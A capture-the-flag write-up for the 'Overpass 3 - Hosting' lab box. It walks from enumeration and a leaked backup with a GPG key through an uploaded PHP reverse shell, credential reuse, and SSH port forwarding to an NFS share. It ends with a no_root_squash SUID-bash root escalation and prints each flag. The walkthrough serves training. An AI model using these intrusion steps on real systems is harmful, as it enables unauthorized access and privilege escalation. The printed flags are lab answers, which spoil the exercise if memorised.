# Overpass 3 - Hosting

You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.

Warning: This box can take around 5 minutes to boot if you're not a subscriber. As a subscriber, it will be ready much faster.

# Web Flag

*Hint: This flag belongs to apache*

## Initial foothold

Nmap detects 3 ports: 21 (FTP), 22 (SSH) and 80 (HTTP).

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix
~~~

## Web

Let's start with the web service, as the FTP service doesn't allow anonymous access.

The web page reveals a few potential usernames:

* Paradox
* Elf
* MuirlandOracle
* NinjaJc01

Enumerating with gobuster allows to discover a hidden `/backups` directory.

~~~
┌──(kali㉿kali)-[/data/Overpass3]
└─$ gobuster dir -u http://10.10.158.2 -x php,txt,old,bak,tar,zip -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.158.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              tar,zip,php,txt,old,bak
[+] Timeout:                 10s
===============================================================
2021/05/04 11:28:22 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.hta.tar             (Status: 403) [Size: 217]
/.hta.zip             (Status: 403) [Size: 217]
/.hta.php             (Status: 403) [Size: 217]
/.hta.txt             (Status: 403) [Size: 217]
/.hta.old             (Status: 403) [Size: 217]
/.hta.bak             (Status: 403) [Size: 217]
/.htaccess.tar        (Status: 403) [Size: 222]
/.htpasswd.tar        (Status: 403) [Size: 222]
/.htaccess.zip        (Status: 403) [Size: 222]
/.htpasswd.zip        (Status: 403) [Size: 222]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd.php        (Status: 403) [Size: 222]
/.htaccess.php        (Status: 403) [Size: 222]
/.htpasswd.txt        (Status: 403) [Size: 222]
/.htaccess.txt        (Status: 403) [Size: 222]
/.htpasswd.old        (Status: 403) [Size: 222]
/.htaccess.old        (Status: 403) [Size: 222]
/.htpasswd.bak        (Status: 403) [Size: 222]
/.htaccess.bak        (Status: 403) [Size: 222]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 235] [--> http://10.10.158.2/backups/]
/cgi-bin/             (Status: 403) [Size: 217]                                  
/index.html           (Status: 200) [Size: 1770]                                 
                                                                                 
===============================================================
2021/05/04 11:32:24 Finished
===============================================================
~~~

## The backup archive

The `/backups/` contains a `backup.zip` file.

~~~                                                                                                                    
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ wget http://10.10.158.2/backups/backup.zip   
                                                                     
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ unzip backup.zip 
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key          
~~~

Import the key and decrypt the file:

~~~
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ gpg --import priv.key                                                                                
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ gpg --decrypt-file CustomerDetails.xlsx.gpg 
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
                                                                                                                    
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ ll
total 44
-rw-r--r-- 1 kali kali 13353 Nov  8 22:24 backup.zip
-rw-r--r-- 1 kali kali 10019 May  4 11:36 CustomerDetails.xlsx
-rw-rw-r-- 1 kali kali 10366 Nov  8 22:18 CustomerDetails.xlsx.gpg
-rw------- 1 kali kali  3522 Nov  8 22:16 priv.key
~~~

Opening the `CustomerDetails.xlsx` spreadsheet shows the following information:

Customer Name | Username | Password | Credit card number | CVC
---|---|---|---|---
Par. A. Doxx | paradox | ShibesAreGreat123 | 4111 1111 4555 1142 | 432
0day Montgomery | 0day | OllieIsTheBestDog | 5555 3412 4444 1115 | 642
Muir Land | muirlandoracle | A11D0gsAreAw3s0me | 5103 2219 1119 9245 | 737

## FTP

Connecting as `paradox` with `ShibesAreGreat123` as password against the FTP service works.

~~~
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ ftp 10.10.158.2
Connected to 10.10.158.2.
220 (vsFTPd 3.0.3)
Name (10.10.158.2:kali): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17 23:54 .
drwxrwxrwx    3 48       48             94 Nov 17 23:54 ..
drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
226 Directory send OK.
ftp> 
~~~

We have access to the website's sources, and the directory is writable. Let's upload a PHP reverse shell:

~~~
ftp> put shell.php 
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (78.1728 MB/s)
ftp> exit
221 Goodbye.
~~~

## Reverse shell

Start a listener (`nc -nlvp 4444`) and browse the shell that has just been uploaded (`curl -s http://10.10.158.2/shell.php`). We now have a reverse shell:

~~~                                                                                                                    
bash-4.4$ id
uid=48(apache) gid=48(apache) groups=48(apache)
~~~

## Web flag

After failing to find the flag by searching for files owned by the `apache` user or group, I eventually found the flag by searching for files matching `*flag*`:

~~~
bash-4.4$ find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
-r--------  1 root root     0 May  4 12:08 /proc/kpageflags
-rw-r--r--  1 root root     0 May  4 12:07 /proc/sys/kernel/acpi_video_flags
-r--r-----  1 root root  4096 May  4 12:08 /sys/devices/platform/serial8250/tty/ttyS1/flags
-r--r-----  1 root root  4096 May  4 12:08 /sys/devices/platform/serial8250/tty/ttyS2/flags
-r--r-----  1 root root  4096 May  4 12:08 /sys/devices/platform/serial8250/tty/ttyS3/flags
-r--r-----  1 root root  4096 May  4 12:08 /sys/devices/pnp0/00:06/tty/ttyS0/flags
-rw-r--r--  1 root root  4096 May  4 12:08 /sys/devices/vif-0/net/eth0/flags
-rw-r--r--  1 root root  4096 May  4 12:08 /sys/devices/virtual/net/lo/flags
-rw-r--r--  1 root root  4096 May  4 12:08 /sys/module/scsi_mod/parameters/default_dev_flags
-rwxr-xr-x. 1 root root  2183 Nov  8  2019 /usr/bin/pflags
-rwsr-xr-x. 1 root root 12704 Apr 14  2020 /usr/sbin/grub2-set-bootflag
-rw-r--r--. 1 root root    38 Nov 17 20:54 /usr/share/httpd/web.flag
-rw-r--r--. 1 root root   285 Apr 14  2020 /usr/share/man/man1/grub2-set-bootflag.1.gz
bash-4.4$ cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
~~~

Web flag: `thm{0ae72f7870c3687129f7a824194be09d}`


# User Flag

*Hint: This flag belongs to james*

## Lateral move (www-data -> paradox)

There are 2 users listed under the `/home` folder. Let's try the password found previously.

~~~
bash-4.4$ ls -la /home
total 0
drwxr-xr-x.  4 root    root     34 Nov  8 19:34 .
drwxr-xr-x. 17 root    root    244 Nov 18 19:16 ..
drwx------.  3 james   james   112 Nov 17 21:15 james
drwx------.  4 paradox paradox 203 Nov 18 18:29 paradox
~~~

We can connect as `paradox` with the password found previously (`ShibesAreGreat123`) in the xls spreadsheet.

At this stage, you can add your SSH public key to `/home/paradox/.ssh/authorized_keys` to connect via SSH directly.

## NFS service

I checked the user privileges but found nothing interesting. Same for files owned by the user. The user doesn't belong to any particular group either.

~~~
[paradox@localhost ~]$ sudo -l
[sudo] password for paradox: 
Sorry, user paradox may not run sudo on localhost.
[paradox@localhost ~]$ find / -type f -user james -exec ls -l {} + 2>/dev/null
-rw-rw----. 1 james mail 0 Nov  8 01:31 /var/spool/mail/james
[paradox@localhost ~]$ id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
~~~

Running `linpeas.sh` on the target will reveal an interesting NFS share (`/home/james`), with the `no_root_squash` option set. We'll come back to this later for the privilege escalation, but at this stage, we only care about the NFS share.

~~~
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
~~~

We confirm that NFS is running on port 2049:

~~~
[paradox@localhost ~]$ rpcinfo -p | grep nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
~~~

I tried to mount the NFS share but it failed, because NFS is only accessible to localhost.

~~~
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ mkdir nfs          
                                                                                                                     
┌──(kali㉿kali)-[/data/Overpass3/files]
└─$ sudo mount -t nfs 10.10.158.2:/home/james nfs      
[sudo] password for kali: 

mount.nfs: Connection timed out
~~~

To make NFS available to us, we'll use a port forwarding as follows:

~~~
$ sshpass -p "ShibesAreGreat123" ssh paradox@10.10.158.2 -L 2049:127.0.0.1:2049
~~~

Now, NFS is available to us, which we can confirm with the below Nmap scan:

~~~
┌──(kali㉿kali)-[/data/Overpass3/files/nfs]
└─$ nmap -p 2049 -sC -sV 127.0.0.1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 15:32 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  nfs     3-4 (RPC #100003)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
~~~

## User flag

And now, we can access the NFS share and get the user flag:

~~~
$ sudo mount -t nfs 127.0.0.1: nfs
$ cd nfs 
$ ll    
total 4
-rw------- 1 kali kali 38 Nov 17 22:15 user.flag
$ cat user.flag 
thm{3693fc86661faa21f16ac9508a43e1ae}
~~~

User flag: `thm{3693fc86661faa21f16ac9508a43e1ae}`

# Root flag

## Lateral move (paradox -> james)

As we have access to `james`'s home, we can add our SSH public key to connect as `james` via SSH directly.

~~~
┌──(kali㉿kali)-[/data/Overpass3/files/nfs]
└─$ ls -la
total 20
drwx------ 3 kali kali  112 Nov 17 22:15 .
drwxr-xr-x 3 kali kali 4096 May  4 15:22 ..
lrwxrwxrwx 1 root root    9 Nov  8 22:45 .bash_history -> /dev/null
-rw-r--r-- 1 kali kali   18 Nov  8  2019 .bash_logout
-rw-r--r-- 1 kali kali  141 Nov  8  2019 .bash_profile
-rw-r--r-- 1 kali kali  312 Nov  8  2019 .bashrc
drwx------ 2 kali kali   61 Nov  8 03:20 .ssh
-rw------- 1 kali kali   38 Nov 17 22:15 user.flag
                                                                                                                     
┌──(kali㉿kali)-[/data/Overpass3/files/nfs]
└─$ cp ~/.ssh/id_rsa.pub .ssh/authorized_keys   
~~~

Now, connect as james:

~~~
$ ssh james@10.10.158.2
~~~

## Privilege Escalation

Remember that `linpeas.sh` reported the following lines:

~~~
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
~~~

The presence of the `no_root_squash` option is a good news for us (see below explanation).

By default, NFS shares change the root user to the `nfsnobody` user, an unprivileged user account. In this way, all root-created files are owned by `nfsnobody`, which prevents uploading of programs with the setuid bit set. However, if the `no_root_squash is used` option is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute.

I first tried to copy the `bash` binary from my Kali box to the NFS share, but it failed to execute on the target:

~~~
[james@localhost ~]$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
~~~

I then tried to copy the version of bash to `james`' home and it worked. On the target, as `james`, I first copied the `bash` binary to the home folder:

~~~
[james@localhost ~]$ cp /usr/bin/bash /home/james/
~~~

Then from my Kali box, I abused the NFS permissions to change the owner and to set the SUID bit:

~~~
┌──(kali㉿kali)-[/data/Overpass3/files/nfs]
└─$ sudo chown root:root bash
                                                                                                                     
┌──(kali㉿kali)-[/data/Overpass3/files/nfs]
└─$ sudo chmod +s bash
~~~

Now back on the target, we have a `bash` binary owned by `root` with the SUID bit set:

~~~
[james@localhost ~]$ ll
total 1196
-rwsr-sr-x  1 root  root  1219248 May  4 17:49 bash
-rw-------. 1 james james      38 Nov 17 21:15 user.flag
~~~

## Root flag

We can now be root and read the flag

~~~
[james@localhost ~]$ ./bash -p
bash-4.4# cat /root/root.flag 
thm{a4f6adb70371a4bceb32988417456c44}
~~~

Root flag: `thm{a4f6adb70371a4bceb32988417456c44}`
